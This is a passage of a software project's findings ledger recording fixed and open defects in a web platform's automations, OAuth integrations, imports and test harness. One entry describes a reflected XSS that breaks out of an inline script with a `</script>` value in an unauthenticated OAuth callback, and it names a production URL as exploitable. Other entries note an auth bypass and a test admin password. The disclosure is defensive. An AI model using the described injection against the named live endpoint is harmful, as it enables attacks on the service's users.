  `createAutomation` (service.ts:356) so nothing is minted before the refusal. An ABSENT `tool` still
  means `browser` - the contract marks the field optional and the wire view always emits one - so
  this refuses only input that was already guaranteed to fail (rule 7: nothing that worked stopped
  working). Pinned by `api/tests/automation/service.test.ts` (4 cases: create refused + nothing
  persisted, unrecognised tool not coerced, patch refused with the stored plan byte-identical, and
  the expressible types + absent-tool default still mapping) and
  `api/tests/contract/automations.test.ts` (2 cases through the real router: 400 + error envelope +
  the message naming `integrationKey, integrationAction` and `POST /api/v1/automations/plan`, and the
  refused automation absent from the following list). Reverted-and-verified: with the old mapper body
  restored, 5 of the 6 turn red and the compatibility guard stays green.
  **THE WIDENING QUESTION: ANSWERED 2026-08-06, NARROWLY.** `integration` now travels; nothing else
  does. The distinction is kind, not degree: an integration step can only name a package the RUN's
  own org already has, it resolves at execution under the run's principal like every other rail,
  and a mutating action still meets the write gate and returns `awaiting_consent` without a live
  approval - so the worst it expresses is a call the same caller could already make through
  `POST /integrations/:key/actions/:name/execute`. `commandTemplate`, `apiRequest`, `ekoaAction`,
  `subAutomationId` and `declaration` remain unauthorable, and their step types stay in the refusal
  table. `PlanStep` gains `integrationKey` / `integrationAction` / `argsTemplate` (shared/, additive
  under rule 7, OpenAPI + generated client regenerated); the service validates SHAPE only - a
  half-specified step is a 400 naming the missing field - and deliberately does NOT re-check which
  integration or whether the action may run, because the engine and the write gate already own both
  decisions and a second copy would drift. `toWireAutomation` projects the three fields BACK, which
  is the half that matters: returning only `{stepId, description, tool}` is what made the original
  loss invisible. Pinned by 4 new cases (service + contract) and verified LIVE with a real gateway
  key: authored, stored, read back on the wire, run `completed`.
  The historical record of the refusal follows.
  **THE ORIGINAL WIDENING QUESTION, AS IT STOOD.** Whether this endpoint should
  carry the parametrised step fields AT ALL is a security decision for the owner, not a bug fix. Engine
  `Step` (`api/src/automation/types.ts:258+`) also carries `commandTemplate` (a local command),
  `apiRequest` (an arbitrary outbound HTTP call), `ekoaAction`, `subAutomationId` and `declaration`
  (`StepDeclaration`, Cofre E-2 - which governs WHERE a step may run and which credential refs it may
  name). Passing those through from a key-auth surface would let any gateway-key holder author local
  commands and arbitrary HTTP calls: the same write rails `F-2026-08-03-ungated-write-rails` finished
  gating, reached from the authoring side instead. The narrow whitelist is containment, and widening it
  is not a mapper detail. CANDIDATE CLOSE: publish a NARROW per-type authoring shape in `shared/`
  covering `integration` only (integrationKey + integrationAction + argsTemplate, validated against the
  caller's own connected integrations through the existing catalog), and leave
  `local_command`/`api_call`/`ekoa_action`/`declaration` unauthorable on this surface - the two ends of
  that risk scale are not one decision. Related dangling promise to resolve in the same unit: `PlanStep`
  already declares `argv?: string[]`, which is parsed, never read by the mapper, and now sits on a step
  type (`local_command`) this endpoint refuses. Any of that changes `shared/` and the generated OpenAPI
  document, which is why it was not done here (review policy: the shared contract is cross-model-review
  scope).

- **`the-automation-editors-save-sends-steps-the-api-never-reads`** (OPEN 2026-08-06, HIGH, silent
  data loss in the product UI - found while fixing the entry above, NOT fixed here). The editor's
  Guardar calls the store with a TOP-LEVEL `steps`
  (`web/app/(dashboard)/automations/[id]/page.tsx:213` -> `update(current.id, { name, description,
  steps: draftSteps })`), the store forwards it as `api.automations.patch({ id, ...patch })`
  (`web/stores/automations.ts:238-250`), and `splitArgs` in `web/lib/api/core.ts` puts every
  non-path argument straight into the PATCH body. The server reads `patch.plan?.steps` and nothing
  else (`api/src/automation/service.ts` `patchAutomation`), and `AutomationPatch` is `.passthrough()`,
  so the key survives zod validation and is then ignored. TWO layers disagree, not one: the view step
  is `{id, description, type}` while the wire step is `{stepId, description, tool}`, so even a server
  that read the top-level key would be reading the wrong field names. NET EFFECT: editing a step and
  pressing Guardar changes nothing server-side, and because the store re-normalises the response into
  `current`, the edit visibly reverts. `create` carries the same mismatch
  (`web/stores/automations.ts:225-236` sends `steps`; `createAutomation` reads `input.plan?.steps`).
  NOT reproduced live - the running stack was off-limits for this unit, so the chain above is read
  from the code, and nothing in the suite contradicts it: neither `tests/drills/automations.spec.ts`
  nor `web/e2e/automation-deterministic.spec.ts` ever presses Guardar. WHY IT MATTERS FOR THE ENTRY
  ABOVE: the editor already authors the very fields the wire shape cannot carry - `step-card.tsx` +
  `integration-action-picker.tsx` let the user pick `integrationKey.actionName`, and
  `step-type-selector.tsx` offers all nine engine step types - so the widening question is not
  hypothetical: the UI has an authoring surface for it today and throws the result away on save.
  CANDIDATE CLOSE: normalise in the store's `create`/`update` (view steps -> `plan.steps` with
  `stepId`/`tool`), the mirror of the `normalizeWireAutomation` that already exists for the read
  direction, plus an e2e that edits a step description, saves, reloads and asserts the new text -
  BUT sequence it after the widening decision, because a faithful editor needs a wire shape that can
  carry an integration step, and until then the honest outcome for those types is the new 400.

- **`activate-page-shipped-untranslated-english`** (FIXED 2026-08-06, MEDIUM, i18n - Drill batch
  `01KZAP1CS3C3FYDYJ6T6ZS7MB9`). The CLI device-activation page (`/activate`) hardcoded every string
  in English ("Authorize this device", "No device code in the link...", "Only approve if you started
  this login...") while the rest of the product renders in pt-PT, so a user bounced here from the
  terminal login hit an untranslated page. FIXED by moving the copy into the locale contract
  (`pages.activate` in `web/locales/{types,pt,en}.ts`) and rendering it through `useTranslation()` in
  `web/app/activate/page.tsx`. The drill's e2e assertions and `tests/drills/activate.spec.ts` were
  moved to the pt-PT strings in the same unit, so `page-language-matches-app` and the text checks
  agree again.

- **`artifact-cards-rendered-literal-invalid-date`** (FIXED 2026-08-06, MEDIUM, data-integrity -
  same batch). Artifact cards printed the literal "Invalid Date" at rest whenever the API handed back
  a null/empty/malformed `createdAt`/`updatedAt`: `formatDate` and the detail-panel's direct
  `new Date(x).toLocaleDateString()` calls all formatted an Invalid Date straight to that string.
  FIXED in `web/components/artifacts/artifacts-surface.tsx` with a `toValidDate()` guard that returns
  null for an unparseable timestamp; `formatDate` now returns `string | null` and every call site
  omits the whole timestamp element rather than printing garbage - "a real formatted Portuguese date
  or the field omitted", per the drill.

- **`change-password-mismatch-rejection-read-as-a-defect-by-a-repair-step`** (DISMISSED 2026-08-06,
  discovery-run false positive, closed by a deterministic test + this dismissal). The batch reported
  that `/change-password` "changed the password rather than rejecting a mismatch", landing on
  `/login`. The page was always correct: `canSubmit` requires `newPassword === confirmPassword`, the
  submit is `disabled` on mismatch, `handleSubmit` early-returns on `!canSubmit`, and the confirm
  field shows "As palavras-passe não coincidem" inline. What the vision judge photographed was the
  run's OWN repair step re-typing a matching confirmation and submitting - the harness acting, not
  the page accepting a mismatch. Closed by graduating the step from vision to a deterministic e2e
  spec (`tests/drills/change-password.spec.ts#mismatch-rejected`) that asserts the inline error is
  shown, the submit stays disabled, and no success banner appears. LESSON: a vision step whose
  "success" only appears after an auto-repair typed the passing input is testing the harness, not the
  product - graduate it to a spec that pins the pre-repair state.
- **`zoho-sign-api-send-needs-a-paid-license`** (OPERATOR-BLOCKED 2026-08-06, external, not a
  defect). Driving the ERP's signature path end to end on staging, `POST /api/zoho-sign/send`
  reached Zoho and came back with `code 12000: Upgrade Zoho Sign license to send documents via
  API`. Everything on our side worked: the served-app context resolved app -> owner, the stored
  refresh token minted an access token against the platform OAuth client, the proposal HTML was
  rendered to PDF by the in-container Chromium, and the request was accepted for transport by
  Zoho's API - which then refused it on PLAN, not on auth or shape. The read side of the same
  credential works (`test_connection` returns live requests), so this is specifically the
  API-send entitlement.
  The refusal surfaces correctly: a sanitized PT-PT message with Zoho's own code preserved for an
  operator, and no token or secret in the body (`sendZohoError`).
  TO FINISH THE FLOW: the Zoho account behind ZOHO_CLIENT_ID needs a Zoho Sign plan that includes
  API sending. Production's account has it - that is why the SALOMAO flow runs there.

- **`microsoft-scopes-omitted-user-read-so-the-connection-probe-403d`** (FIXED 2026-08-06, MEDIUM,
  an integration that works reporting itself broken). `MICROSOFT_SCOPES` listed `openid profile
  email` and no `User.Read`. Those three populate the ID TOKEN; they do not authorize the Graph
  `/me` RESOURCE. Measured on staging against a real work/school connection: `/me` answered
  `403 Authorization_RequestDenied` while `/me/messages`, `/me/mailFolders/inbox/messages`,
  `/me/drive` and the whole SharePoint site-drive surface answered 200. `/me?$select=mail,
  userPrincipalName` is exactly what the SALOMAO ERP calls as its "is the workspace connected"
  probe (two screens), so the product would have shown the integration as broken while mail, files
  and SharePoint were all working.
  FIXED by adding `User.Read` to the requested scopes, pinned in
  `api/tests/integrations/platform.test.ts` alongside `offline_access` and `Sites.ReadWrite.All`.
  NOTE FOR THE OPERATOR: scopes are granted at CONSENT, so an already-connected workspace keeps the
  old grant - the Microsoft integration must be disconnected and reconnected once for `/me` to
  start answering.

- **`microsoft-connect-never-showed-an-account-picker`** (FIXED 2026-08-06, HIGH, a connect that
  binds the workspace to an account the user never chose - and cannot undo from the product).
  `microsoftAuthUrl` (`api/src/integrations/platform-oauth.ts`) sent no `prompt` parameter, while
  its Google sibling three functions above sends `prompt: 'select_account consent'`. Without it the
  Microsoft identity platform reuses whatever account the browser is already signed into and
  returns straight to the callback: the operator clicks "Ligar", a window flashes, and the page
  says "Ligação concluída" having asked nothing. Observed live on staging - a PERSONAL (MSA)
  account got bound this way, and it reports healthy on every surface we have while `/v1.0/sites`
  answers `not supported for MSA accounts`, i.e. the SharePoint capability the plane exists for
  cannot run (see `workspace-microsoft-connected-as-a-personal-account-cannot-reach-sharepoint`).
  WHY IT IS WORSE THAN A MISCLICK: there is no in-product recovery. Disconnecting drops OUR row but
  not Microsoft's browser session, so the next connect silently rebinds the same wrong account, and
  the operator has no affordance anywhere to choose a different one. The only escape was signing
  out of Microsoft in the browser.
  FIXED: `prompt: 'select_account'` on the Microsoft authorize URL - `select_account` alone rather
  than Google's pair, because Microsoft documents `prompt` as a SINGLE value
  (login|none|consent|select_account) and re-prompts consent by itself for a new account or scope
  set. Pinned by `api/tests/integrations/platform.test.ts`, which now asserts the picker parameter
  for BOTH providers in one test (the asymmetry is the bug, so the assertion is symmetric) plus
  that Microsoft still requests `offline_access` and `Sites.ReadWrite.All`.

- **`workspace-microsoft-connected-as-a-personal-account-cannot-reach-sharepoint`** (OPEN
  2026-08-06, MEDIUM, configuration + a swallowed failure the product should surface). On staging
  the workspace Microsoft connect completed and every platform-side signal says connected:
  `/api/v1/platform-integrations/microsoft` -> `{connected:true}`, `/api/app-cloud-files/status` ->
  `microsoft.connected:true`, and a real Graph call through the served-app proxy returns real data
  (`GET /api/m365/v1.0/me/drive` -> a live OneDrive). The workspace-credential seam is therefore
  working end to end. But the account that was connected is a PERSONAL Microsoft account (MSA), and
  SharePoint is an organizational-tenant API: `GET /v1.0/sites?search=...` and `GET /v1.0/organization`
  both answer `BadRequest: This API is not supported for MSA accounts`. So the SALOMAO ERP's
  `provisionClientSharePoint` - which does `/sites?search=Ekoa AI` and then PUTs the client folder
  tree into that site's drive - cannot work with this connection, while the dashboard shows the
  integration as healthy.
  TWO THINGS MAKE THIS WORSE THAN A WRONG CLICK. (1) `MICROSOFT_TENANT_ID=common` admits both
  account types, so nothing at consent time distinguishes the account that can do the job from the
  one that cannot; ekoa-dev's exchange decoded the id_token `tid` claim (`9188040d-...` = MSA)
  precisely so an org-only feature could tell them apart, and that discrimination was not ported.
  (2) The ERP swallows the failure: its SharePoint provisioning is deliberately best-effort so the
  conversion cascade never blocks, which means a user sees the client convert successfully and
  simply never gets folders, with no error anywhere.
  FIX (operator): connect the WORK/SCHOOL account of the tenant that owns the SharePoint site
  (prod used `ekoaai.sharepoint.com`), not a personal one. FIX (product, unported): record the
  account type at connect and either refuse or warn when an org-only capability is enabled against
  an MSA connection - a status that says "connected" while the only feature it exists for cannot
  run is the honest-degrade rule broken.

- **`zoho-callback-page-script-injection`** (FIXED-HERE 2026-08-06, HIGH, **live in ekoa-dev /
  api.ekoa.io** - not a defect of this repo, a defect this repo refused to inherit). The Zoho OAuth
  callback renders a server-built HTML page that hands the outcome to the opener via
  `postMessage`, embedding the values with `JSON.stringify` inside an inline `<script>`.
  `JSON.stringify` does not escape `/`, so a value containing a literal `</script>` CLOSES the
  script element during HTML parsing and everything after it is parsed as markup. The injected
  value on that page is the OAuth error string, which is reflected straight from Zoho's own
  `?error=` query parameter on an **unauthenticated** route - so a crafted link is reflected XSS on
  the API origin, with no state, no login and no interaction beyond the click. Same shape in the
  human-readable message line.
  In the port, `jsonForScript()` escapes `<`, `>`, `&` and U+2028/U+2029 before embedding, and the
  fallback link is attribute-escaped; the payload still arrives intact, just inert. Pinned by
  `api/tests/integrations/zoho-oauth.test.ts`, which asserts the page still contains exactly one
  `<script>`/`</script>` pair after an injection attempt. Found BY writing that test - upstream has
  no test of this route at all, which is also how its credential-clearing regression reached a
  customer.
  ACTION FOR THE OPERATOR: this is exploitable in production today at
  `https://api.ekoa.io/api/v1/oauth/zoho/callback?error=...`. The same `buildOAuthResultPage` is
  shared by the ADOBE callback, so both providers are affected. Fix is the four-line escape above,
  in `cortex/src/server.ts buildOAuthResultPage`.

- **`import-ignores-the-bundle-slug`** (FIXED 2026-08-14, LOW as filed — re-rated in practice: for
  the salomao migration the slug is the public URL living in emails already sent to the customer's
  clients, so the S3 slice closed it). The shared
  `ArtifactBundle` declares an optional `slug`, and `convert-dev-bundle.mjs` sets it from `--slug`,
  but `importArtifact` calls `generateSlug(name, deps)` and never reads `bundle.slug`. Importing
  `legal-case-manager-3` therefore produced `erp-juridico-brasil-salomao` (derived from the app's
  display name) with no warning. Harmless here - the served URL is cosmetic and app-data is keyed on
  the canonical id, not the slug - but a field the schema advertises and the importer silently drops
  is the same class of defect as the two manifest bugs fixed this week. FIX WHEN TOUCHED: honour
  `bundle.slug` when it is free, fall back to the generated one when taken, and say which happened.
  FIXED (2026-08-14, S3) exactly per that prescription: `importArtifact` honours a well-formed
  `bundle.slug` via an atomic reservation insert (duplicate `_id` = taken), falls back to
  `generateSlug` otherwise, and the import response now carries an additive `importReport` saying
  which happened (`slug.requested/applied/fellBack`). Landed together with the explicit
  `preserveId` migration mode (canonical id adopted from `bundle.id` only when the request opts in,
  409-refused on collision — `docs/decisions.md` 2026-08-14) and per-collection app-data seeding
  reports. Suites: `api/tests/apps/import-app-data-fidelity.test.ts`,
  `api/tests/contract/artifact-family.test.ts` (import block), `api/tests/migration/convert-dev-bundle.test.ts`.

- **`artifact-import-could-not-accept-a-real-app`** (FIXED 2026-08-06, HIGH, the import endpoint
  did not work for its own purpose). `POST /api/v1/artifacts/import` sat behind the app-wide 1 MB
  `express.json()`, and a real app export is bigger than that: the production
  `legal-case-manager-3` bundle is **1.34 MB of source alone**, before any app-data dump, and
  prod's own exporter admits files up to 1.5 MB EACH. So the endpoint whose entire job is
  importing real apps could only ever accept toy ones, and the first genuine import answered
  `413 PAYLOAD_TOO_LARGE`. `POST /:id/bundle-update` - the path prod patches are pushed through -
  had exactly the same ceiling.
  FIXED with the LLM gateway's established pattern, both halves: the two bundle routes mount their
  own parser (`bundleJson`, 25 MB, `EKOA_ARTIFACT_BUNDLE_MAX_SIZE`) AND `server.ts` exempts those
  paths from the global parser - without the exemption the global one consumes the body first and
  the router limit is dead code, which is the trap the gateway hit in run 20260717. The exemption
  is pinned at both ends (`/import` exact; `/:id/bundle-update` with the id charset between fixed
  segments) so no sibling route widens. Suite: `api/tests/contract/malformed-json.test.ts` asserts
  a 1.4 MB body reaches auth on both bundle routes (401, never 413) and that two neighbours -
  `POST /artifacts` and `/bundle-update/extra` - still cap at 1 MB.
  WHY IT WAS NEVER CAUGHT: every fixture bundle was small. The size limit is not a property any
  hand-written test bundle exercises, and the operator-run import driver skips cleanly without a
  real export - so the first real payload was the first test.

- **`prod-export-manifest-never-reached-the-import`** (FIXED 2026-08-06, HIGH, silent capability
  loss on every prod import). The first real export of `legal-case-manager-3` from api.ekoa.io
  carried 26 scaffold files and **no `manifest.json` among them** - prod keeps that information in
  the envelope's separate `manifest` FIELD, which it assembles from its own defaults overlaid with
  the on-disk file. `convert-dev-bundle.mjs` read only `id`/`name`/`version` off that field and
  dropped the rest, and ekoa-code's importer reads what an app declares from a manifest FILE. Net
  effect: the ERP would have imported with a DEFAULT manifest - no `backend: {handlers:['onEmail']}`,
  no `extends: 'app-auth-persistent'` - and would have built, served its UI, and silently never
  processed an email. Nothing would have failed; the feature would simply not exist.
  FIXED: the converter now always writes `manifest.json` into `bundle.files` from the envelope's
  manifest field, filling the build fields a sparse prod manifest omits, and the envelope's copy
  WINS over a stale scaffold copy of the same path (never both). Suite: the manifest-fidelity block
  in `api/tests/migration/convert-dev-bundle.test.ts`, including a case asserting the reconstructed
  manifest passes ekoa-code's own `validateManifest`.
  CAUGHT BY a warning deliberately put in the one-shot operator import script rather than by a test
  - the two formats had been "equivalent" in every fixture written by hand, because every fixture
  author put a manifest.json in the scaffold. The real export did not. Related and landed the same
  day: `ensureManifest` now REFUSES an invalid manifest instead of defaulting past it.

- **`m365proxy-manifest-flag-stripped`** (FIXED 2026-08-05, HIGH, dead opt-in - the workspace
  Microsoft plane could never be reached by any app). The Q-10 gate on `/api/m365/*`
  (`api/src/integrations/m365-proxy.ts`) requires a per-app manifest opt-in, and `server.ts`'s
  `resolveAppScope` reads it: `m365Proxy: (reg?.manifest as {m365Proxy?: boolean})?.m365Proxy === true`.
  But `validateManifest` (`api/src/apps/manifest.ts`) returns a WHITELIST of named keys, and
  `m365Proxy` was not among them - so the registry's manifest never carried the flag no matter what
  the author wrote in `manifest.json`, `resolveAppScope` always computed `false`, and every request
  to the workspace Graph proxy answered `403 App has not enabled the Microsoft 365 workspace proxy`.
  Two independent gates (served + opt-in) read as one that can never open. It went unnoticed because
  the plane's other half was ALSO stubbed (see the next finding): with the token seam throwing
  not-connected, a 403 and a 502 both looked like "not wired yet".
  FIXED: `m365Proxy?: boolean` declared on `AppManifest`, validated as a boolean (a truthy STRING is
  refused, never coerced into an opt-in), and carried through the return. Pinned by
  `api/tests/apps/manifest.test.ts`, which asserts both halves of the whitelist property - the
  declared flags survive a write→read round-trip, an undeclared key still does not.
  LESSON: a whitelist validator between an author and a consumer is a silent-drop machine. Any
  manifest key a gate reads needs a test that carries it end to end, not a type declaration.

- **`workspace-graph-token-was-a-permanent-not-connected-stub`** (FIXED 2026-08-05, HIGH,
  unimplemented plane presented as a wired one). `server.ts` passed `workspaceNotConnected(...)` as
  `getWorkspaceGraphToken` for `/api/m365/*` and as `workspaceCloudFiles.getAccessToken` for
  `/api/app-cloud-files/*`: both planes were mounted, documented, gated and tested, and could not
  reach Microsoft Graph at all. Honest (502 / 409, never a fake success) but permanently inert, so
  the SharePoint provisioning the SALOMAO ERP performs through `/api/m365/v1.0/sites/...` had no
  server-side path.
  FIXED by `api/src/integrations/workspace-credential.ts`: the workspace of a served app is the ORG
  OF ITS OWNER - platform-OAuth rows are org-scoped (`platform-<orgId>-<provider>`) - so the token is
  resolved per request from the app scope the router already admitted, refreshed behind the seam,
  and never ambient. Fails closed on an empty/unknown/org-less owner (no provider traffic at all on
  behalf of a non-tenant) and keeps the `not connected` / `reconnect required` degrade contract both
  routers already mapped. Suites: `api/tests/integrations/workspace-credential.test.ts` (tenancy,
  refresh, dead-token reauth, no token in an error message) and the extended
  `api/tests/contract/app-sso.test.ts`, which pins that the owner spent is the ADMITTED app's - not
  the header, not the caller's JWT - and that a refused gate never reaches the seam at all.
  STILL OPEN alongside it: the docx link/cloud ingest keeps the not-connected stub, because a build's
  tool call carries an appId but no owner down to `agents/seams.ts fetchFromCloud`; threading the
  run's owner through is tracked in `docs/dev-parity.md`.

- **`a-partial-credential-save-replaced-the-whole-bundle`** (FIXED 2026-08-05, HIGH, silent
  destruction of a stored secret). `updateConfig` (`api/src/integrations/service.ts`) encrypted
  `patch.configValues` verbatim as the new bundle, so a save carried away every field it did not
  include. A credential form only sends what was typed in that browser session - a masked field the
  user did not retype comes back as `''`, a field the form does not render does not come back at
  all - so re-pasting a Zoho `client_id`/`client_secret` erased the permanent `refresh_token`. In the
  old platform that exact sequence took Brasil Salomão's e-signature down (ekoa-dev `ca446cb0`,
  2026-07-28); this repo carried the same shape, untriggered only because nobody had re-saved a
  credential yet. Two further consequences rode along: the WS-C shadow and the non-secret
  `publicConfigValues` projection were both computed from the patch, so a partial save shrank the
  Rule-10 comparator's shadow and could drop a destination field a standing approval was bound to.
  FIXED: `mergeCredentialValues` - absent keys, `null`/`undefined`, and empty/whitespace strings all
  leave the stored value alone; only the explicit `CLEAR_CREDENTIAL` sentinel deletes a key. The
  ciphertext, the shadow and the projection are all computed from the MERGED bundle. An undecryptable
  stored blob now RETURNS `undecryptable` (route: 422 `SECRET_GUARD_BLOCKED`, telling the user to
  re-enter every credential) instead of merging blind - degrading to `{}` there would have turned a
  rotated encryption key into a full wipe on the very next save. Suite:
  `api/tests/integrations/credential-merge.test.ts` reproduces the Zoho incident directly.
  NOT a new error code on purpose: the shared `ErrorCode` enum is a client contract, and adding a
  member makes older clients read the body as "not the shared error envelope".

- **`chokepoint-gate-case-test-failed-on-a-case-insensitive-filesystem`** (FIXED 2026-08-05, LOW,
  harness-not-product). `tests/security/grep-gates.test.ts` planted `api/src/LLM/p.ts` in a sandbox
  that pre-creates `api/src/llm`, and asserted the gate refuses it. On macOS APFS the `mkdir` is a
  no-op and the file lands in the exempt directory, so the gate correctly reported clean and the
  test failed - on every local full-suite run, for months, on the harness rather than on the gate.
  FIXED by probing the sandbox filesystem once and skipping exactly that case when it cannot be
  posed (CI on Linux still runs it), with the always-true half - the real `llm/` paths ARE exempt -
  split into its own test that runs everywhere. Found while running the suite for an unrelated
  change; see also the ledger-census drift below - two gates rotted the same way.

- **`client-drift-gate-red-on-a-stale-node_modules`** (FIXED 2026-08-05, LOW, environment).
  `npm run gate:client-drift` - which sits in `ci:lane` BEFORE `typecheck`/`test`/`build`, so its
  failure hides everything after it - died with `ERR_MODULE_NOT_FOUND: openapi-typescript` on a
  clean tree. The package is correctly declared in `clients/cortex-cli/package.json`; the local
  `node_modules` had simply drifted from the lock file. `npm install` fixed it with NO lock-file
  change, and the gate reports clean. Worth knowing because the failure mode reads like client
  drift and is not: an `ERR_MODULE_NOT_FOUND` from a gate means the gate did not run.

- **`suite-ledger-unit-census-drifted-red`** (FIXED 2026-08-05, LOW, gate rot). `npm run gate:ledger`
  had been failing its frontend-unit count census (disk 50 vs ledger 49) since commit `105e10b`,
  which landed `web/__tests__/integration-user-scoped-skill.test.ts` without its `SUITE_LEDGER.json`
  row. Registered, with the reason recorded in the ledger's own `census_note` (the same class of
  omission that note already records three times). Found during an unrelated parity run - the census
  is only load-bearing if somebody runs it.

- **`the-dev-harness-proxy-never-propagated-client-disconnects`** (FIXED 2026-08-05, MEDIUM,
  dev-harness resource leak - and the root of a whole false defect report). `driver.mjs up`
  occupies `backend.port` (4111) with a small CORS reverse proxy and runs the real API on 4211.
  Its forward path did `proxyRes.pipe(res)` and nothing else: `pipe` forwards DATA, never
  TEARDOWN, so when a browser closed an SSE stream the proxy's upstream request to the API stayed
  open forever. The API never saw the disconnect, so `res.on('close')` never fired, its
  `SseManager` client was never deleted, and its 30s keepalive timer went on writing into a dead
  socket for the life of the process. `/health`'s `bridgeConnections` therefore only ever climbed:
  measured 67 attached clients against 12 real ESTABLISHED sockets, and +2 per document load with
  no decrease on page close, context close, or browser exit.
  THE API WAS ALWAYS CORRECT. The identical connect/abort straight to :4211 returns to baseline in
  under 3 seconds; `res.on('close')` fires, the client is deleted, the timer is cleared. That one
  substitution - bypass the proxy - is what separated harness from product, after `express.json`,
  the three `noServer` WebSocket upgrade surfaces, and an isolated Express 5 reproduction had all
  been eliminated as suspects. FIXED in the proxy: `res.once('close')` destroys the upstream
  request, with a `clientGone` flag so the existing error/retry path does not treat a deliberate
  teardown as an upstream failure and re-issue the GET. Verified: 0 -> 3 -> 0 within 2.5s through
  :4111, and flat at 1 across 12 full page loads (was 19 -> 46).
  WHY IT MATTERS BEYOND THE LEAK: a Drill authoring run read that climbing counter as evidence and
  wrote a fabricated "STANDING DEFECT" into `drills/drillbook.yml` - see the dismissal below.
  LESSON: a monotonic counter is not a measurement. Before believing `/health`, check it against
  something independent (here, `ss` said 12 where the counter said 67).

- **`a-drill-run-reported-a-product-wide-hang-that-was-its-own-harness`** (DISMISSED 2026-08-05,
  discovery-run finding, closed by written dismissal per the QA block). A Drill authoring run
  restarted the stack, re-tested, and reported a STANDING DEFECT: "the dashboard's data reads never
  reach the browser", every list sitting two minutes then rendering a red `Request timed out after
  120000ms` banner over a false empty state, `/settings/users` printing "0 utilizadores  0
  administrador  0 ativo" to the administrator it was counting, `/utilizacao` showing a silent
  false empty, `/registo` claiming "Sem entradas no registo.", `/chat` stranded on a spinner, and
  the /change-password form spinning forever. It concluded roughly a third of the Book's assertions
  should be expected red and that every page needed a two-minute settle.
  NONE OF IT REPRODUCES. Re-driven the same day against the same stack, in a clean browser context:
  every named page renders in full, every request behind them answers 200 in single-digit ms, the
  token meter resolves to "0/10.0M" - across 12 full page loads AND 35 client-side navigations,
  with zero pending requests. `/registo` shows 35 entries, `/chat` renders its composer, and the
  change-password form posts `/api/v1/auth/password`, gets 200 in 757ms and lands on /login in ~3s.
  CAUSE: the run drove a long-lived explorer browser through the leaking harness proxy above, and
  read the climbing `bridgeConnections` counter as proof of a product-wide fetch failure. Its own
  transcript records the counter reaching 6 - Chrome's per-origin HTTP/1.1 connection limit - which
  is how a genuinely wedged tab and a mis-attributed counter looked alike.
  TWO OF ITS CLAIMS WERE REAL and are fixed separately: the raw English timeout string (below) and
  the dead recovery link (below). One was a harness artifact of a different kind: `/registo`'s
  "mm/dd/yyyy" date filters are `<input type="date">`, whose display format is chosen by the
  BROWSER's locale and cannot be set by the page - headless Chromium defaults to en-US. Not a
  product defect; do not re-file it.
  ACTION TAKEN: the fabricated STANDING DEFECT block in `drills/drillbook.yml` `globalRules` is
  replaced with a retraction plus the verified account, because as written it would have told every
  future run to wait two minutes per page and to attribute any red assertion to a defect that does
  not exist. The four page files whose notes cited the 120s timeout are annotated in place.
  LESSON: the run did the right thing by restarting the stack to rule out a stale environment, and
  still landed on the wrong cause because it never tested the API without the harness in front of
  it. When browser and curl disagree, the thing between them is the first suspect.

- **`a-raw-english-timeout-string-reaches-a-pt-pt-ui`** (FIXED 2026-08-05, LOW, copy). The Drill run
  was right that `Request timed out after 120000ms` is a defect, even though the hang that surfaced
  it was not real. `web/lib/api/core.ts` threw three transport failures with English developer
  strings - `Request timed out after ${timeoutMs}ms`, `Request aborted`, `Network request failed` -
  and callers surface `err.message` directly, so any real timeout puts English in front of a
  Portuguese-only product. The class docblock in `web/lib/api/errors.ts` already asserted these
  messages were "user-safe and PT-aware", which was false for exactly these three. FIXED to the
  wording the `backendErrors` block in `web/locales/pt.ts` already uses for the same conditions;
  the machine-readable `code` is unchanged and the timeout budget moved into `details` rather than
  being printed at the user.

- **`the-forgot-password-link-pointed-at-a-page-needing-the-forgotten-password`** (FIXED 2026-08-05,
  LOW, dead-end UX). `/login` rendered "Esqueceu-se da palavra-passe?" as a `<Link href="/change-password">`.
  That route requires authentication AND the current password - the very thing the user has lost -
  and, signed out, redirects straight back to /login, so clicking it did nothing at all: no route
  change, no dialog, no message, no console error. There is no self-service recovery in this
  product: the only reset is `POST /api/v1/users/:id/password`, auth class `super-admin`. FIXED by
  replacing the dead control with the instruction that matches reality ("Peça ao administrador da
  plataforma para a repor."), stacked below the remember-me checkbox rather than beside it - sharing
  that flex row forced the checkbox label onto three lines in a 400px card.

- **`a-forced-password-change-was-skipped-on-the-submit-path`** (FIXED 2026-08-05, HIGH, auth
  bypass - found while verifying a Drill planning run's defect list). `seedAdmin` creates the
  super-admin with `passwordChangeRequired: true` and `POST /auth/login` returns that flag, but
  /login's `redirectAfterAuth` read it out of a **stale closure**: `handleSubmit` calls the callback
  immediately after `await login(...)` resolves, and the captured `passwordChangeRequired` is still
  the PRE-login value (`false`), so the branch that routes to /change-password never ran and the user
  landed on the dashboard. The same function already dodged this exact hazard for the token — it
  takes `latestToken` as a parameter *because* the store write is not visible to this closure — and
  the flag was left reading the stale one right beside it. The already-authenticated path
  (`useEffect` at mount, from a persisted token) used the reactive value and DID redirect, which is
  why the behaviour looked intermittent: sign in fresh and the forced change was skipped, arrive
  with a token and it was enforced. FIXED by reading `useAuthStore.getState().passwordChangeRequired`
  at call time. Verified: three consecutive fresh sign-ins now land on /change-password showing
  "Deve alterar a palavra-passe antes de continuar".
  NOTE: ~30 e2e specs signed in as admin and asserted `waitForURL(/\/chat/)` — i.e. the suite was
  green *because of* this bug. They now route through `web/e2e/helpers/ui-login.ts`, which normalises
  the admin over the API before driving the UI (spend the forced change, then change back, leaving
  `admin`/`tmp12345` with the flag clear) so the many specs that authenticate over the API with the
  seeded password keep working. The forced-change path itself stays covered by change-password.spec.ts.
  LESSON: a callback that already takes one post-await value as a parameter is announcing that its
  closure is stale; every other store field it reads is suspect for the same reason.

- **`a-404-detail-page-never-left-its-loading-state`** (FIXED 2026-08-05, MEDIUM, honest state).
  `/automations/<unknown-id>` rendered a bare full-viewport "A carregar..." forever. The requests had
  in fact finished — `GET /automations/:id` and `.../triggers` both answered 404 in ~20ms — but the
  page's only early return was `if (!current || current.id !== id) return <LoadingState/>`, with no
  branch for "the fetch is over and produced nothing". The store already tracked `currentLoading` and
  `error`; the page read neither. A spinner over a finished 404 is a lie, and it also stripped the
  user of the page header and of any way back. FIXED with a three-way branch (loading / not-found /
  loaded); the not-found state renders the section header plus an EmptyState and a "Voltar às
  automatizações" link. Guarded against a first-render flash of the not-found state by gating on a
  ref holding the id a fetch was actually dispatched for, since `currentLoading` is still false on
  the render before the effect runs.

- **`pt-pt-copy-was-partly-brazilian-and-partly-unaccented`** (FIXED 2026-08-05, LOW, copy quality).
